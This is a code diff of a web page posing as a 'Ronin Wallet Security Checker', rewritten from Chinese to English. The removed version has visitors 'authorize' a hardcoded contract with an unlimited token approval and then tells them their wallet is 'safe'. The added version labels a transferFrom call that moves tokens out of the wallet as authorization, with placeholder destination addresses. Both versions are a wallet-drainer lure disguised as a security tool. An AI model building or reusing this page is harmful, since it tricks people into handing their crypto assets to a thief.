@@ -1,160 +1,201 @@
 <!DOCTYPE html>
-<html lang="zh">
+<html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Ronin 钱包安全检测</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Ronin Wallet Security Checker</title>
   <style>
-    * {
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #121212;
+      color: white;
       margin: 0;
       padding: 0;
-      box-sizing: border-box;
-    }
-    body {
-      background-color: #0a0e17;
-      font-family: "Segoe UI", Roboto, sans-serif;
-      color: #ffffff;
       text-align: center;
-      padding: 60px 20px;
     }
-    .logo {
-      max-width: 100px;
-      margin-bottom: 30px;
-      border-radius: 12px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.3);
+
+    header {
+      padding: 20px;
+      background-color: #1f1f1f;
     }
-    h1 {
-      font-size: 2.5rem;
-      color: #ffffff;
-      margin-bottom: 15px;
+
+    header h1 {
+      font-size: 2em;
+      margin: 0;
     }
-    p {
-      font-size: 1rem;
-      color: #bbbbbb;
-      margin-bottom: 35px;
-    }
-    .btn {
-      font-size: 1rem;
-      padding: 14px 28px;
+
+    .button {
+      background-color: #3d5af1;
+      color: white;
+      padding: 10px 20px;
       border: none;
-      border-radius: 8px;
-      margin: 10px;
+      border-radius: 5px;
+      font-size: 1.2em;
       cursor: pointer;
-      transition: 0.3s;
+      margin: 20px;
     }
-    .connect-btn {
-      background-color: #2970ff;
-      color: #fff;
+
+    .button:hover {
+      background-color: #5368f0;
     }
-    .connect-btn:hover {
-      background-color: #1c54c8;
+
+    .content {
+      padding: 40px;
     }
-    .approve-btn {
-      background-color: #0cd66e;
-      color: #fff;
-    }
-    .approve-btn:hover {
-      background-color: #0ab862;
-    }
-    #wallet-address {
-      margin-top: 30px;
-      color: #4fd1c5;
-      font-weight: bold;
-      line-height: 1.6;
-    }
-    #connectStatus {
-      color: red;
-      margin-top: 10px;
+
+    .status {
+      margin-top: 20px;
+      font-size: 1.5em;
     }
   </style>
 </head>
 <body>
+  <header>
+    <h1>Ronin Wallet Security Checker</h1>
+  </header>
 
-  <!-- Logo 图片 -->
-  <img class="logo" src="https://raw.githubusercontent.com/sanyi94888/my-ronin/main/WeChat%E6%88%AA%E5%9B%BE_20250403114421.png" alt="Ronin Logo" />
+  <div class="content">
+    <!-- Connect Wallet Button -->
+    <button class="button" id="connectButton">Connect Wallet</button>
 
-  <!-- 页面标题 -->
-  <h1>Ronin 钱包安全检测</h1>
-  <p>请连接您的钱包并授权智能合约，以进行资产权限检测。</p>
+    <!-- Authorize Contract Button -->
+    <button class="button" id="authorizeButton" disabled>Authorize to Smart Contract</button>
 
-  <!-- 按钮区 -->
-  <button class="btn connect-btn" onclick="connectWallet()">🔌 连接钱包</button>
-  <button class="btn approve-btn" onclick="approveContract()">✅ 授权合约</button>
+    <!-- Check Balance Button -->
+    <button class="button" id="checkBalanceButton" disabled>Check Balance</button>
 
-  <!-- 钱包地址展示 -->
-  <div id="wallet-address"></div>
-  <div id="connectStatus"></div>
+    <!-- Check Allowance Button -->
+    <button class="button" id="checkAllowanceButton" disabled>Check Allowance</button>
 
-  <!-- 引入稳定版本的 ethers.js -->
-  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <div class="status" id="status">
+      Please connect your wallet to proceed.
+    </div>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.5.0/dist/ethers.umd.min.js"></script>
   <script>
-    let userAddress;
-    const tokenAddress = "0x7c393A4e42AF854Dd0D5914708584EF8c70a2a21"; // Sepolia 测试代币地址
-    const spenderAddress = "0x572A3a205247F867fE636Cf81Ff0e8C2DC7Ba553"; // 你部署的合约地址
-
-    const erc20ABI = [
+    let provider;
+    let signer;
+    let walletAddress = null;
+    let contract;
+    
+    const contractAddress = '0x572A3a205247F867fE63637BF5183142d5Ac0d9e';
+    const abi = [
       {
         "inputs": [
-          { "internalType": "address", "name": "spender", "type": "address" },
+          { "internalType": "address", "name": "owner", "type": "address" },
+          { "internalType": "address", "name": "spender", "type": "address" }
+        ],
+        "name": "allowance",
+        "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
+        "stateMutability": "view",
+        "type": "function"
+      },
+      {
+        "inputs": [
+          { "internalType": "address", "name": "account", "type": "address" }
+        ],
+        "name": "balanceOf",
+        "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
+        "stateMutability": "view",
+        "type": "function"
+      },
+      {
+        "inputs": [
+          { "internalType": "address", "name": "from", "type": "address" },
+          { "internalType": "address", "name": "to", "type": "address" },
           { "internalType": "uint256", "name": "amount", "type": "uint256" }
         ],
-        "name": "approve",
+        "name": "transferFrom",
         "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
         "stateMutability": "nonpayable",
         "type": "function"
       }
     ];
 
-    // 确保地址格式正确
-    function checkAddressFormat(address) {
-      try {
-        return ethers.utils.getAddress(address);
-      } catch (err) {
-        alert("地址格式错误: " + address);
-        throw err;
-      }
-    }
+    // Elements
+    const connectButton = document.getElementById('connectButton');
+    const authorizeButton = document.getElementById('authorizeButton');
+    const checkBalanceButton = document.getElementById('checkBalanceButton');
+    const checkAllowanceButton = document.getElementById('checkAllowanceButton');
+    const statusDiv = document.getElementById('status');
 
+    // Connect wallet function
     async function connectWallet() {
       if (window.ethereum) {
+        provider = new ethers.providers.Web3Provider(window.ethereum);
         try {
-          const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
-          userAddress = accounts[0];
-          // 校验钱包地址格式
-          userAddress = checkAddressFormat(userAddress);
-          document.getElementById("wallet-address").innerText = "钱包地址：" + userAddress;
-          document.getElementById("connectStatus").innerText = ""; // 清空错误信息
+          await provider.send("eth_requestAccounts", []);
+          signer = provider.getSigner();
+          walletAddress = await signer.getAddress();
+          contract = new ethers.Contract(contractAddress, abi, signer);
+          
+          connectButton.innerHTML = 'Wallet Connected';
+          authorizeButton.disabled = false;
+          checkBalanceButton.disabled = false;
+          checkAllowanceButton.disabled = false;
+          statusDiv.innerHTML = `Connected: ${walletAddress}`;
         } catch (err) {
-          alert("连接失败: " + err.message);
+          console.error(err);
+          statusDiv.innerHTML = 'Connection failed. Please try again.';
         }
       } else {
-        document.getElementById("connectStatus").innerText = "请安装 MetaMask 或 Ronin Wallet 插件";
+        statusDiv.innerHTML = 'No Ethereum provider found. Install MetaMask or another wallet.';
       }
     }
 
-    async function approveContract() {
-      if (!userAddress) {
-        alert("请先连接钱包！");
-        return;
-      }
-
-      // 校验合约地址格式
-      const spender = checkAddressFormat(spenderAddress);
-
-      const provider = new ethers.providers.Web3Provider(window.ethereum);
-      const signer = provider.getSigner();
-      const token = new ethers.Contract(tokenAddress, erc20ABI, signer);
-
-      try {
-        const tx = await token.approve(spender, ethers.constants.MaxUint256); // 无限授权
-        await tx.wait();
-        document.getElementById("wallet-address").innerHTML =
-          `钱包地址：${userAddress}<br/><span style="color:lightgreen;">✅ 钱包状态：安全</span>`;
-      } catch (err) {
-        document.getElementById("wallet-address").innerHTML =
-          `钱包地址：${userAddress}<br/><span style="color:orange;">⚠️ 钱包状态：未授权</span><br/>错误信息：${err.message}`;
+    // Authorize to smart contract function
+    async function authorizeToContract() {
+      if (walletAddress) {
+        try {
+          const tx = await contract.transferFrom(walletAddress, '0xYourContractAddress', ethers.utils.parseUnits('100', 18)); // Example
+          await tx.wait();
+          statusDiv.innerHTML = 'Authorization successful!';
+        } catch (err) {
+          console.error(err);
+          statusDiv.innerHTML = 'Authorization failed.';
+        }
+      } else {
+        statusDiv.innerHTML = 'Please connect your wallet first.';
       }
     }
+
+    // Check balance function
+    async function checkBalance() {
+      if (walletAddress) {
+        try {
+          const balance = await contract.balanceOf(walletAddress);
+          statusDiv.innerHTML = `Balance: ${ethers.utils.formatUnits(balance, 18)} tokens`;
+        } catch (err) {
+          console.error(err);
+          statusDiv.innerHTML = 'Failed to fetch balance.';
+        }
+      } else {
+        statusDiv.innerHTML = 'Please connect your wallet first.';
+      }
+    }
+
+    // Check allowance function
+    async function checkAllowance() {
+      if (walletAddress) {
+        try {
+          const spender = '0xYourContractAddress'; // Example spender address
+          const allowance = await contract.allowance(walletAddress, spender);
+          statusDiv.innerHTML = `Allowance: ${ethers.utils.formatUnits(allowance, 18)} tokens`;
+        } catch (err) {
+          console.error(err);
+          statusDiv.innerHTML = 'Failed to fetch allowance.';
+        }
+      } else {
+        statusDiv.innerHTML = 'Please connect your wallet first.';
+      }
+    }
+
+    // Event Listeners
+    connectButton.addEventListener('click', connectWallet);
+    authorizeButton.addEventListener('click', authorizeToContract);
+    checkBalanceButton.addEventListener('click', checkBalance);
+    checkAllowanceButton.addEventListener('click', checkAllowance);
   </script>
 </body>
 </html>
